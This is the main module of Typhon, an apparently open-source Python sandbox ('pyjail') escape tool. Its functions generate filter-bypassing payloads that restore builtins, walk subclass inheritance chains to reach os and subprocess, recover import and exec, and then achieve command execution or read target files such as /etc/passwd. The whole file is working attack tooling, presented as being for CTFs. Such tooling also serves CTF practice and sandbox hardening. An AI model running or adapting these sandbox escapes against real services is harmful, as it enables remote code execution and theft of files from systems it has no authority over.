# This file is the main file of the Typhon package.
# It is emphasized again that the code is only for educational purposes
# (like in CTFs) and should not be used for any malicious purposes.
# The code is maintained on github. If any bugs found or you have any
# suggestions, please raise an issue or pull request on the github
# repository https://github.com/Team-intN18-SoybeanSeclab/Typhon.
# If you have any questions, please feel free to contact me.
# Weilin Du <lamentxu644@gmail.com>, 2025.

subclasses = object.__subclasses__()[:-1]  # delete ast.AST

import logging

from inspect import currentframe
from typing import Any, Dict, Union

# need to be set before other imports
log_level_ = "INFO"  # changeable in bypassMAIN()
search_depth = 5  # changeable in bypassMAIN()
logging.basicConfig(level=log_level_, format="%(levelname)s %(message)s")
logger = logging.getLogger(__name__)

# get current global scope
current_frame = currentframe()
try:
    while current_frame.f_globals["__name__"] != "__main__":
        current_frame = current_frame.f_back
except KeyError:
    # This is for readthedocs build. See https://github.com/LamentXU123/Typhon/pull/1/
    # You would not use this in a real environment.
    current_global_scope = (
        currentframe().f_back.f_back.f_back.f_back.f_back.f_back.f_globals
    )
finally:
    current_global_scope = current_frame.f_globals

from .utils import *

# The RCE data including RCE functions and their parameters.
from .RCE_data import *

VERSION = "1.0.12.1"
BANNER = (
    r"""
    .-')          _                 Typhon: a pyjail bypassing tool
   (`_^ (    .----`/                
    ` )  \_/`   __/     __,    [Typhon Version]: v"""
    + VERSION
    + r"""
    __{   |`  __/      /_/     [Python Version]: v"""
    + sys.version.split()[0]
    + r"""
   / _{    \__/ '--.  //       [Github]: https://github.com/Team-intN18-SoybeanSeclab/Typhon
   \_> \_\  >__/    \((        [Author]: LamentXU <lamentxu644@gmail.com>
        _/ /` _\_   |))       
"""
)

print(BANNER)


def bypassMAIN(
    local_scope: Dict[str, Any] = None,
    endpoint: str = None,
    banned_chr: list = [],
    allowed_chr: list = [],
    banned_ast: List[ast.AST] = [],
    banned_re: Union[str, List[str]] = [],
    max_length: int = None,
    allow_unicode_bypass: bool = False,
    print_all_payload: bool = False,
    interactive: bool = True,
    depth: int = 5,
    recursion_limit: int = 100,
    log_level: str = "INFO",
) -> None:
    """
    This is the main function of the Typhon package.
    Every bypass function calls this for basic bypassing.
    This function basically gets every useful thing in possible
    for further bypassing implemented in other bypass* functions.

    :param local_scope: is a list of local variables in the sandbox environment.
    :param banned_chr: is a list of blacklisted characters.
    :param allowed_chr: is a list of allowed characters.
    :param banned_ast: is a list of banned AST.
    :param banned_re: is a banned regex.
    :param allow_unicode_bypass: if unicode bypasses are allowed.
    :param depth: is the depth that combined bypassing being generarted.
    :param recursion_limit: is the maximum recursion depth for bypassers.
    :param print_all_payload: if all payloads should be printed.
    :param interactive: if the pyjail is a interactive shell that allows stdin.
    :param log_level: is the logging level, default is INFO, change it to
    DEBUG for more details.
    """
    global achivements, log_level_, generated_path, search_depth, tagged_scope, try_to_restore, reminder, string_dict, allowed_letters, is_localscope_set, allowed_int, banned_ast_, banned_chr_, banned_re_, max_length_, original_scope, int_dict, allowed_chr_, import_test, modules_test, load_module_test, interactive_
    import_test, load_module_test, modules_test = False, False, False
    if isinstance(banned_re, str):
        banned_re = [banned_re]  # convert to list if it's a string
    if isinstance(banned_chr, str):
        banned_chr = [i for i in banned_chr]
        logger.warning(
            "[!] banned_chr should be a list, converting to list for compatibility."
        )
    if local_scope == None:
        # If the local scope is not specified, raise a warning.
        is_localscope_set = False
        logger.warning("[!] local scope not specified, using the global scope.")
        logger.debug("[*] current global scope: %s", current_global_scope)
        local_scope = current_global_scope
        local_scope["__builtins__"] = __builtins__
        is_builtins_rewrited = False
    else:
        is_localscope_set = True
        is_builtins_rewrited = True if "__builtins__" in local_scope else False
    banned_chr_ = banned_chr
    banned_ast_ = banned_ast
    banned_re_ = banned_re
    max_length_ = max_length
    allowed_chr_ = allowed_chr
    interactive_ = interactive
    sys.setrecursionlimit(recursion_limit)
    logger.debug("[*] current recursion limit: %d", sys.getrecursionlimit())
    string_dict = (
        {}
    )  # The dictionary of string literals found in the scope (e.g. {'b': bytes.__doc__[0]})
    int_dict = {}  # The dictionary of integer literals found in the scope
    useful_modules = [
        "os",
        "subprocess",
        "uuid",
        "pydoc",
        "_posixsubprocess",
        "multiprocessing",
        "builtins",
        "codecs",
        "warnings",
        "base64",
        "importlib",
        "weakref",
        "reprlib",
        "sys",
        "linecache",
        "pty",
        "io",
        "ctypes",
        "profile",
        "timeit",
        "_aix_support",
        "_osx_support",
    ]
    log_level_ = log_level.upper()
    if log_level_ not in ["DEBUG", "INFO", "QUIET"]:
        logger.warning("[!] Invalid log level, using INFO instead.")
        log_level_ = "INFO"
    if log_level_ == "QUIET":
        from os import devnull

        log_level_ = "CRITICAL"  # for test scripts & QUIET mode
        sys.stdout = open(devnull, "w")  # disable stdout
    if log_level_ != "DEBUG":
        from warnings import filterwarnings

        filterwarnings("ignore")

    logger.setLevel(log_level_)
    reminder = (
        {}
    )  # The reminder of bypass method that could not be used in remote (like inheritance chain)
    search_depth = depth  # The maximum search depth for combined bypassing
    if allow_unicode_bypass:
        # test if unicode char is printable
        try:
            print("TESTING [*] unicode test: 𝕒")
            print("\033[2A")
        except UnicodeEncodeError:
            logger.warning(
                "[!] We cannot print unicode in the shell, set allow_unicode_bypass to False."
            )
            logger.warning(
                "[!] Please, change a better shell to enable the unicode feature."
            )
            allow_unicode_bypass = False
    achivements = {}  # The progress we've gone so far. Being output in the end
    generated_path = (
        {}
    )  # The generated bypassing paths e.g. {'GENERATOR': '(a for a in ()).gi_frame'}
    original_scope = copy(
        local_scope
    )  # fix: In case of some unpickleable objects (like module), using shallow copies
    # changes in local scope comparing to standard builtins
    change_in_builtins = [
        i for i in local_scope if i in dir(builtins) and not i.startswith("__")
    ]

    def try_to_restore(
        data_name: str, check: object = None, end_of_prog=False, cmd=None, bash_cmd=None
    ):
        """
        Try to obtain certain thing from the original scope.
        data_name is a string that can refer to a list in RCE_data.json
        check is a class-type object to check if the payload is valid,
        if not specified, any object will be accepted.
        end_of_prog is a boolean flag to indicate if the program is ending if
        one of the restore success.
        cmd is a string refer to the command executed in the payload.
        """
        data_name_tag = data_name.upper()
        current_scope = get_name_and_object_from_tag(data_name_tag, tagged_scope)
        if (
            data_name_tag not in generated_path
            and not is_blacklisted(data_name)
            and current_scope
        ):
            logger.info("[+] %s exists in the original scope.", data_name)
            achivements[data_name] = [current_scope[0][0], 1]
            tags.append(data_name_tag)
            generated_path[data_name_tag] = current_scope[0][0]
            tagged_scope[current_scope[0][0]] = [current_scope[0][1], data_name_tag]
            return
        path = filter_path_list(RCE_data[data_name], tagged_scope)
        if path:
            logger.info(
                "[*] %d paths found to obtain %s. \
Try to bypass blacklist with them. Please be paitent.",
                len(path),
                data_name,
            )
            logger.debug("[*] %s paths: %s", data_name, str([i[0] for i in path]))
            _ = try_bypasses(
                path,
                banned_chr,
                banned_ast,
                banned_re,
                max_length,
                allow_unicode_bypass,
                tagged_scope,
                cmd,
                bash_cmd,
            )
            if _:
                success = False
                for i in _:
                    # If end of program, no need to exec to check in case of being stuck
                    # by RCE function like help()
                    if end_of_prog:
                        exec_with_returns_ = lambda _, __: True
                    else:
                        exec_with_returns_ = exec_with_returns
                    result = exec_with_returns_(i, original_scope)
                    original_scope.pop("__return__", None)
                    if (result.__class__ == check or check is None) and (
                        not result is None or end_of_prog
                    ):
                        success = True
                        tagged_scope[i] = [result, data_name_tag]
                        achivements[data_name] = [i, len(_)]
                        tags.append(data_name_tag)
                        generated_path[data_name_tag] = i
                        break
                if success:
                    logger.info("[+] Success. %d payload(s) in total.", len(_))
                    logger.info(f"[*] Using {i} as payload of {data_name}")
                    logger.debug(f"[*] payloads: {_}")
                    if end_of_prog:
                        if print_all_payload:
                            bypasses_output(_)
                        bypasses_output(i)
                else:
                    achivements[data_name] = ["None", 0]
                    logger.info(
                        "[-] no way to bypass blacklist to obtain %s.", data_name
                    )
            else:
                achivements[data_name] = ["None", 0]
                logger.info("[-] no way to bypass blacklist to obtain %s.", data_name)
        else:
            achivements[data_name] = ["None", 0]
            logger.info("[-] no paths found to obtain %s.", data_name)

    def try_to_import():
        """
        try to import modules with different methods
        """
        global import_test, load_module_test, modules_test
        if "IMPORT" in tags and not import_test:
            import_test = True
            logger.info("[*] try to import modules with IMPORT path.")
            for i in useful_modules:
                progress_bar(useful_modules.index(i) + 1, len(useful_modules))
                module_path = [
                    "IMPORT('" + i + "')",
                    {"IMPORT": generated_path["IMPORT"]},
                ]
                for _ in BypassGenerator(
                    module_path,
                    allow_unicode_bypass=allow_unicode_bypass,
                    local_scope=tagged_scope,
                ).generate_bypasses():
                    if not is_blacklisted(_):
                        result = exec_with_returns(_, original_scope)
                        original_scope.pop("__return__", None)
                        if not result is None:
                            if result.__name__ == sys.modules[i].__name__:
                                try:
                                    searched_modules[i].append(_)
                                except KeyError:
                                    pass
            print()
        if "LOAD_MODULE" in tags and not load_module_test:
            load_module_test = True
            logger.info("[*] try to import modules with LOAD_MODULE path.")
            for i in useful_modules:
                progress_bar(useful_modules.index(i) + 1, len(useful_modules))
                module_path = [
                    "LOAD_MODULE('" + i + "')",
                    {"LOAD_MODULE": generated_path["LOAD_MODULE"]},
                ]
                for _ in BypassGenerator(
                    module_path,
                    allow_unicode_bypass=allow_unicode_bypass,
                    local_scope=tagged_scope,
                ).generate_bypasses():
                    if not is_blacklisted(_):
                        result = exec_with_returns(_, original_scope)
                        original_scope.pop("__return__", None)
                        if not result is None:
                            if result.__name__ == sys.modules[i].__name__:
                                try:
                                    searched_modules[i].append(_)
                                except KeyError:
                                    pass
            print()
        if "MODULES" in tags and not modules_test:
            modules_test = True
            logger.info("[*] try to import modules with MODULES path.")
            for i in useful_modules:
                progress_bar(useful_modules.index(i) + 1, len(useful_modules))
                module_path = [
                    "MODULES['" + i + "']",
                    {"MODULES": generated_path["MODULES"]},
                ]
                for _ in BypassGenerator(
                    module_path,
                    allow_unicode_bypass=allow_unicode_bypass,
                    local_scope=tagged_scope,
                ).generate_bypasses():
                    if not is_blacklisted(_):
                        result = exec_with_returns(_, original_scope)
                        original_scope.pop("__return__", None)
                        if not result is None:
                            if result.__name__ == sys.modules[i].__name__:
                                try:
                                    searched_modules[i].append(_)
                                except KeyError:
                                    pass
            print()
        # merge searched_modules to tagged_scope
        for module in searched_modules:
            payload_list = searched_modules[module]
            if payload_list:
                payload_list.sort(key=len)
                payload_with_reminder = []
                payload = None
                for i in payload_list:
                    for j in reminder:
                        if j in i:
                            payload_with_reminder.append(i)
                for i in payload_list:
                    if i not in payload_with_reminder:
                        payload = i
                        break
                if not payload:
                    payload = payload_with_reminder[0]
                if module == "__builtins__":
                    tag = "BUILTINS_SET"
                else:
                    tag = "MODULE_" + module.upper()
                result = exec_with_returns(payload, original_scope)
                original_scope.pop("__return__", None)
                if result:
                    tagged_scope[payload] = [result, tag]
                    tags.append(tag)
                    generated_path[tag] = payload
                    achivements[module] = [payload, len(searched_modules[module])]

    def get_simple_path():
        simple_path = (
            filter_path_list(RCE_data["directly_getshell"], tagged_scope)
            if interactive and not is_builtins_rewrited
            else []
        )
        if simple_path:
            logger.info(
                "[*] %d paths found to directly getshell. \
Try to bypass blacklist with them. Please be paitent.",
                len(simple_path),
            )
            logger.debug("[*] simple paths: %s", str([i[0] for i in simple_path]))
            _ = try_bypasses(
                simple_path,
                banned_chr,
                banned_ast,
                banned_re,
                max_length,
                allow_unicode_bypass,
                tagged_scope,
            )
            if _:
                logger.info(
                    "[+] directly getshell success. %d payload(s) in total.", len(_)
                )
                logger.debug("[*] payloads to directly getshell: ")
                logger.debug(_)
                logger.info(
                    "[+] You now can use this payload to getshell directly with proper input."
                )
                achivements["directly input bypass"] = [_[0], len(_)]
                if print_all_payload:
                    bypasses_output(_)
                bypasses_output(_[0])
            else:
                achivements["directly input bypass"] = ["None", 0]
                logger.info("[-] no way to bypass blacklist to directly getshell.")
        else:
            achivements["directly input bypass"] = ["None", 0]
            logger.info("[-] no paths found to directly getshell.")

    # Step1: Analyze and tag the local scope
    if "__builtins__" not in local_scope:
        local_scope["__builtins__"] = __builtins__
    # not using | for backward compatibility
    local_scope = merge_dicts(local_scope["__builtins__"], local_scope)
    if not is_localscope_set:
        local_scope["__builtins__"] = __import__("builtins")
    tagged_scope = tag_scope(local_scope, change_in_builtins)
    # check if we got an UNKNOWN tag
    for i in tagged_scope:
        if tagged_scope[i][0] == "UNKNOWN":
            logger.warning("[!] Unknown object: %s", tagged_scope[i][0])
    logger.debug("[*] tagged scope: %s", tagged_scope)
    tags = [i[1] for i in tagged_scope.values()]
    searched_modules = {
        item: []
        for item in useful_modules
        if item not in get_module_from_tagged_scope(tagged_scope)
    }
    allowed_letters = [
        i for i in ascii_letters + "_" if i not in banned_chr and i not in local_scope
    ]
    allowed_int = [i for i in digits if i not in banned_chr and i not in local_scope]
    if allowed_chr != []:
        for i in allowed_letters:
            if i not in allowed_chr:
                allowed_letters.remove(i)
        for j in allowed_int:
            if j not in allowed_chr:
                allowed_int.remove(j)
    obj_list = [i for i in tagged_scope]
    obj_list.sort(key=len)

    string_ords = [ord(i) for i in remove_duplicate(ascii_letters + digits + endpoint)]
    get_simple_path()

    def check_all_collected():
        all_colleted = True
        for i in string_ords:
            if chr(i) not in string_dict:
                all_colleted = False
                break
        return all_colleted

    for i in string_ords:
        if not is_blacklisted(f"'{chr(i)}'", ast_check_enabled=False) and chr(i) != "'":
            string_dict[chr(i)] = f"'{chr(i)}'"
        elif (
            not is_blacklisted(f'"{chr(i)}"', ast_check_enabled=False) and chr(i) != '"'
        ):
            string_dict[chr(i)] = f'"{chr(i)}"'
    obj_list.sort(key=len)
    if not check_all_collected():
        logger.info("[*] Try to get string literals from docstrings.")
        for i in obj_list:
            obj = tagged_scope[i][0]
            string = getattr(obj, "__doc__", None)
            if is_blacklisted(i) and not allow_unicode_bypass:
                continue
            if string:
                for index, j in enumerate(string):
                    progress_bar(index + 1, len(string))
                    if j not in string_dict and ord(j) in string_ords:
                        payload = i + ".__doc__[" + str(index) + "]"
                        for _ in BypassGenerator(
                            [payload, []], allow_unicode_bypass, tagged_scope
                        ).generate_bypasses():
                            if is_blacklisted(_):
                                continue
                            string_dict[j] = _
                            reminder[_] = (
                                f"index {index} of {payload} must match the string literal {j}."
                            )
                            break
                        if check_all_collected():
                            break
                if check_all_collected():
                    break
                print()
    if not check_all_collected():
        logger.info("[*] Try to get string literals from __name__.")
        for i in obj_list:
            obj = tagged_scope[i][0]
            doc = getattr(obj, "__name__", None)
            if is_blacklisted(i) and not allow_unicode_bypass:
                continue
            if doc:
                for index, j in enumerate(doc):
                    progress_bar(index + 1, len(doc))
                    if j not in string_dict and ord(j) in string_ords:
                        payload = i + ".__name__[" + str(index) + "]"
                        for _ in BypassGenerator(
                            [payload, []], allow_unicode_bypass, tagged_scope
                        ).generate_bypasses():
                            if is_blacklisted(_):
                                continue
                            string_dict[j] = _
                            reminder[_] = (
                                f"index {index} of {payload} must match the string literal {j}."
                            )
                            break
                        if check_all_collected():
                            break
                if check_all_collected():
                    break
                print()
    logger.info("[*] string literals found: %s", string_dict)
    allowed_letters.extend(string_dict.keys())
    for i in digits:
        if not is_blacklisted(i):
            int_dict.update({int(i): i})
            continue
        # tyr bool bypass
        if i == 0 and is_blacklisted("False"):
            if not is_blacklisted('False.real'):
                int_dict.update({int(i): 'False.real'})
            if not is_blacklisted('False.imag'):
                int_dict.update({int(i): 'False.imag'})
            if not is_blacklisted('+'):
                int_dict.update({int(i): 'False+False'})
        else:
            if not is_blacklisted(f"True" + '+True' * int(i-1)):
                int_dict.update({int(i): f"True" + '+True' * int(i-1)})
        # TODO: bypassers to get ints
    logger.info("[*] int literals found: %s", int_dict)

    # Step2: Try to exec directly with simple paths
    get_simple_path()

    # Step3: Try to find generators
    try_to_restore("generator", (a for a in ()).gi_frame.__class__)

    # Step4: Try to restore type
    try_to_restore("type", type.__class__)

    # Step5: Try to restore object & bytes
    try_to_restore("object", object.__class__)
    try_to_restore("bytes", bytes.__class__)

    # Step6: Restore builtins (if possible)
    if not is_builtins_rewrited:  # some thing was missing
        logger.info("[*] Restoring __builtins__ in this namespace.")
        builtin_path = filter_path_list(
            RCE_data["restore_builtins_in_current_ns"], tagged_scope
        )
        if builtin_path:
            logger.info(
                "[*] %d paths found to restore builtins. \
Try to bypass blacklist with them. Please be paitent.",
                len(builtin_path),
            )
            logger.debug("[*] restore paths: %s", str([i[0] for i in builtin_path]))
            _ = try_bypasses(
                builtin_path,
                banned_chr,
                banned_ast,
                banned_re,
                max_length,
                allow_unicode_bypass,
                tagged_scope,
            )
            if _:
                logger.info("[+] builtins restored. %d payload(s) in total.", len(_))
                logger.debug("[*] payloads to restore builtins: ")
                logger.debug(_)
                builtin_dict_found_count, builtin_module_found_count = 0, 0
                builtin_dict_payload, builtin_module_payload = None, None
                for i in _:
                    check_result = exec_with_returns(i, original_scope)
                    original_scope.pop("__return__", None)
                    if check_result == __builtins__ and type(check_result) == dict:
                        if not builtin_dict_found_count:
                            logger.info(
                                "[*] Using %s as the restored builtins dict.", i
                            )
                            tagged_scope[i] = [check_result, "BUILTINS_SET"]
                            builtin_dict_payload = i
                            tags.append("BUILTINS_SET")
                            generated_path["BUILTINS_SET"] = i
                        builtin_dict_found_count += 1
                    elif check_result == builtins and type(check_result) == ModuleType:
                        if not builtin_module_found_count:
                            logger.info(
                                "[*] Using %s as the restored builtins module.", i
                            )
                            tagged_scope[i] = [check_result, "MODULE_BUILTINS"]
                            builtin_module_payload = i
                            tags.append("MODULE_BUILTINS")
                            generated_path["MODULE_BUILTINS"] = i
                        builtin_module_found_count += 1
                    else:
                        if (
                            not check_result == builtins
                            and not check_result == __builtins__
                        ):
                            logger.debug("[!] %s is not the restored builtins.", i)
                achivements["builtins set"] = [
                    builtin_dict_payload,
                    builtin_dict_found_count,
                ]
                achivements["builtins module"] = [
                    builtin_module_payload,
                    builtin_module_found_count,
                ]
                if not builtin_dict_payload and not builtin_module_payload:
                    logger.info(
                        "[-] no way to find a bypass method to restore builtins."
                    )
                else:
                    if interactive and not is_builtins_rewrited:
                        try_to_restore(
                            "builtins2RCEinput", end_of_prog=True
                        )  # try to RCE directly with builtins
            else:
                logger.info("[-] no way to find a bypass method to restore builtins.")
        else:
            logger.info("[-] no paths found to restore builtins.")
    else:
        logger.info(
            "[*] __builtins__ in this namespace is deleted, no way to restore it."
        )

    # Step7: Try to restore __builtins__ in other namespaces (if possible)
    # The code is somehow duplicated with the previous step, but I'm not turning it to one func caz
    # it is only used twice.
    if "BUILTINS_SET" not in tags and "MODULE_BUILTINS" not in tags:
        logger.info("[*] try to find __builtins__ in other namespaces.")
        builtin_path = filter_path_list(
            RCE_data["restore_builtins_in_other_ns"], tagged_scope
        )
        if builtin_path:
            logger.info(
                "[*] %d paths found to restore builtins in other namespaces. \
Try to bypass blacklist with them. Please be paitent.",
                len(builtin_path),
            )
            logger.debug("[*] restore paths: %s", str([i[0] for i in builtin_path]))
            _ = try_bypasses(
                builtin_path,
                banned_chr,
                banned_ast,
                banned_re,
                max_length,
                allow_unicode_bypass,
                tagged_scope,
            )
            if _:
                logger.info("[+] builtins restored. %d payload(s) in total.", len(_))
                logger.debug("[*] payloads to restore builtins: ")
                logger.debug(_)
                builtin_dict_found_count, builtin_module_found_count = 0, 0
                builtin_dict_payload, builtin_module_payload = None, None
                for i in _:
                    check_result = exec_with_returns(i, original_scope)
                    original_scope.pop("__return__", None)
                    if check_result == __builtins__ and type(check_result) == dict:
                        if not builtin_dict_found_count:
                            logger.info(
                                "[*] Using %s as the restored builtins dict.", i
                            )
                            tagged_scope[i] = [check_result, "BUILTINS_SET"]
                            builtin_dict_payload = i
                            tags.append("BUILTINS_SET")
                            generated_path["BUILTINS_SET"] = i
                        builtin_dict_found_count += 1
                    elif check_result == builtins and type(check_result) == ModuleType:
                        if not builtin_module_found_count:
                            logger.info(
                                "[*] Using %s as the restored builtins module.", i
                            )
                            tagged_scope[i] = [check_result, "MODULE_BUILTINS"]
                            builtin_module_payload = i
                            tags.append("MODULE_BUILTINS")
                            generated_path["MODULE_BUILTINS"] = i
                        builtin_module_found_count += 1
                    else:
                        if (
                            not check_result == builtins
                            and not check_result == __builtins__
                        ):
                            logger.debug("[!] %s is not the restored builtins.", i)
                achivements["builtins set"] = [
                    builtin_dict_payload,
                    builtin_dict_found_count,
                ]
                achivements["builtins module"] = [
                    builtin_module_payload,
                    builtin_module_found_count,
                ]
                if not builtin_dict_payload and not builtin_module_payload:
                    logger.info(
                        "[-] no way to find a bypass method to restore builtins in other namespaces."
                    )
            else:
                logger.info(
                    "[-] no way to find a bypass method to restore builtins in other namespaces."
                )
        else:
            logger.info("[-] no paths found to restore builtins in other namespaces.")

    if (
        ("BUILTINS_SET" in tags or "MODULE_BUILTINS" in tags)
        and interactive
        and not is_builtins_rewrited
    ):
        logger.info("[*] try to RCE directly with builtins.")
        try_to_restore("builtins2RCEinput", end_of_prog=True)

    # Step8: Try inheritance chain
    if "OBJECT" in tags:
        logger.info("[*] Trying to find inheritance chains.")
        subclasses_len = len(subclasses)
        searched_modules_tmp = deepcopy(searched_modules)
        for index, i in enumerate(subclasses):
            progress_bar(index + 1, subclasses_len)
            try:
                for j in searched_modules:
                    if j in i.__init__.__globals__:
                        object_path = generated_path["OBJECT"]
                        payload = [
                            f"OBJECT.__subclasses__()[{index}].__init__.__globals__['{j}']",
                            {"OBJECT": object_path},
                        ]
                        for _ in BypassGenerator(
                            payload,
                            allow_unicode_bypass=allow_unicode_bypass,
                            local_scope=tagged_scope,
                        ).generate_bypasses():
                            if not is_blacklisted(_):
                                result = exec_with_returns(_, original_scope)
                                original_scope.pop("__return__", None)
                                if not result is None:
                                    searched_modules_tmp[j].append(_)
                                    reminder[_] = (
                                        f"{index} is the index of {i.__name__}, path to {j} must fit in index of {i.__name__}."
                                    )
                            continue
            except AttributeError:
                pass
        print()
        for i in useful_modules:
            if i not in searched_modules_tmp:
                # get_name_and_object_from_tag return something like [('os', <module 'os' (built-in)>)]
                achivements[i] = [
                    get_name_and_object_from_tag("MODULE_" + i.upper(), tagged_scope)[
                        0
                    ][0],
                    1,
                ]
        for k in searched_modules_tmp:
            payload = searched_modules_tmp[k]
            if not payload:
                continue
            payload.sort(key=len)
            searched_modules[k].append(payload[0])
            logger.info(f"[+] Found inheritance chain: {payload[0]} -> {k}")
    else:
        logger.info("[*] No object found, skip inheritance chains.")

    # Step9: Try to restore __import__
    try_to_restore("import")
    try_to_restore("load_module")
    try_to_restore("modules")

    # Step10: Try to import modules
    try_to_import()

    # Again, try to restore __import__
    try_to_restore("import")
    try_to_restore("load_module")
    try_to_restore("modules")

    # Again, try to import modules
    try_to_import()

    logger.info("[*] modules we have found:")
    logger.info(get_module_from_tagged_scope(tagged_scope))

    # Step11: Try to restore exec functions
    if not find_object(exec, tagged_scope):
        try_to_restore("exec")

    # Step12: Try to RCE directly with builtins
    if ("BUILTINS_SET" in tags or "MODULE_BUILTINS" in tags) and (
        interactive and not is_builtins_rewrited
    ):
        logger.info("[*] try to RCE directly with builtins.")
        try_to_restore("builtins2RCEinput", end_of_prog=True)

    return generated_path


def bypassRCE(
    cmd,
    local_scope: dict = None,
    banned_chr: list = [],
    allowed_chr: list = [],
    banned_ast: list = [],
    banned_re: list = [],
    max_length: int = None,
    allow_unicode_bypass: bool = False,
    print_all_payload: bool = False,
    interactive: bool = True,
    depth: int = 5,
    recursion_limit: int = 200,
    log_level: str = "INFO",
):
    """
    The main function to try to RCE in sandbox.

    :param cmd: is the command to execute.
    :param local_scope: is a list of local variables in the sandbox environment.
    :param banned_chr: is a list of blacklisted characters.
    :param allowed_chr: is a list of allowed characters.
    :param banned_ast: is a list of banned AST.
    :param banned_re: is a list of banned regex.
    :param allow_unicode_bypass: if unicode bypasses are allowed.
    :param depth: is the depth that combined bypassing being generarted.
    :param recursion_limit: is the maximum recursion depth for bypassers.
    :param print_all_payload: if all payloads should be printed.
    :param interactive: if the pyjail is a interactive shell that allows stdin.
    :param log_level: is the logging level, default is INFO, change it to
    DEBUG for more details.
    """
    if cmd == "":
        logger.critical("[!] command is empty, nothing to execute.")
        quit(1)

    generated_path = bypassMAIN(
        local_scope,
        banned_chr=banned_chr,
        endpoint=cmd,
        allowed_chr=allowed_chr,
        banned_ast=banned_ast,
        banned_re=banned_re,
        max_length=max_length,
        allow_unicode_bypass=allow_unicode_bypass,
        depth=depth,
        recursion_limit=recursion_limit,
        interactive=interactive,
        print_all_payload=print_all_payload,
        log_level=log_level,
    )

    bash_cmd = None
    command_bypasser = BashBypassGenerator()
    for i in command_bypasser.Generate(cmd):
        if i is not None:
            if not is_blacklisted(i, ast_check_enabled=False):
                logger.info("[+] Using %s as the command to execute.", i)
                bash_cmd = i
                break

    try_to_restore("__import__2RCE", end_of_prog=True, cmd=cmd, bash_cmd=bash_cmd)

    return bypasses_output(generated_path=generated_path)


def bypassREAD(
    filepath: str,
    RCE_method: str,
    local_scope: dict = None,
    is_allow_exception_leak: bool = True,
    banned_chr: list = [],
    allowed_chr: list = [],
    banned_ast: list = [],
    banned_re: list = [],
    max_length: int = None,
    allow_unicode_bypass: bool = False,
    print_all_payload: bool = False,
    interactive: bool = True,
    depth: int = 5,
    recursion_limit: int = 200,
    log_level: str = "INFO",
):
    """
    The main function to try to RCE in sandbox.

    :param filepath: path to target file (e.g. /etc/passwd).
    :param RCE_method: method to RCE, can be "exec" or "eval".
    :param is_allow_exception_leak: if exception leak is allowed, will use exception to leak filedata.
    :param local_scope: is a list of local variables in the sandbox environment.
    :param banned_chr: is a list of blacklisted characters.
    :param allowed_chr: is a list of allowed characters.
    :param banned_ast: is a list of banned AST.
    :param banned_re: is a banned regex.
    :param allow_unicode_bypass: if unicode bypasses are allowed.
    :param depth: is the depth that combined bypassing being generarted.
    :param recursion_limit: is the maximum recursion depth for bypassers.
    :param print_all_payload: if all payloads should be printed.
    :param interactive: if the pyjail is a interactive shell that allows stdin.
    :param log_level: is the logging level, default is INFO, change it to
    DEBUG for more details.
    """
    if filepath == "":
        logger.critical("[!] filepath is empty, nothing to read.")
        quit(1)
    if RCE_method != "exec" and RCE_method != "eval":
        logger.critical("[!] RCE method is not supported, only support exec or eval.")
        quit(1)
    generated_path = bypassMAIN(
        local_scope,
        endpoint=filepath,
        banned_chr=banned_chr,
        allowed_chr=allowed_chr,
        banned_ast=banned_ast,
        banned_re=banned_re,
        max_length=max_length,
        allow_unicode_bypass=allow_unicode_bypass,
        depth=depth,
        recursion_limit=recursion_limit,
        interactive=interactive,
        print_all_payload=print_all_payload,
        log_level=log_level,
    )
    try_to_restore("filecontentsio", cmd=filepath)
    if RCE_method == "exec":
        try_to_restore("filecontentstring", cmd=filepath)
        if is_allow_exception_leak:
            try_to_restore("print_filecontent_error", cmd=filepath, end_of_prog=True)
        try_to_restore("print_filecontent", cmd=filepath, end_of_prog=True)
    else:
        try_to_restore("filecontentstring", cmd=filepath, end_of_prog=True)
    return bypasses_output(generated_path=generated_path)
